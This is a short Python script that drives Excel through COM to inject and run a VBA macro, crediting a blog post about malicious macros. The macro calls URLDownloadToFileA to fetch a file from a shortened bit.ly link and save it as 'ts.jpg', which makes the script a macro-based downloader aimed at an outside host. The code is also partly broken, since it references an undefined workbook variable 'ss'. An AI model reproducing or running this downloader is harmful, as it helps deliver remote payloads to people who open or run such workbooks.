import win32com.client as win32
import comtypes, comtypes.client

xl = win32.gencache.EnsureDispatch('Excel.Application')
xl.Visible = True
sumshit = xl.Workbooks.Add()
sh = ss.ActiveSheet

xlmodule = ss.VBProject.VBComponents.Add(1)

# thanks to https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/ i hate writing this shit
xlmodule.Name = "shittylol123"
macro_shit = """
Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As LongPtr _
) As Long

Sub DownloadFile()
     URLDownloadToFileA 0, "https://bit.ly/2B1GCyQ", "ts.jpg", 0, 0
End Sub
"""

xlmodule.CoreModule.AddFromString(macro_shit)
ss.Application.Run('shittylol123.DownloadFile')
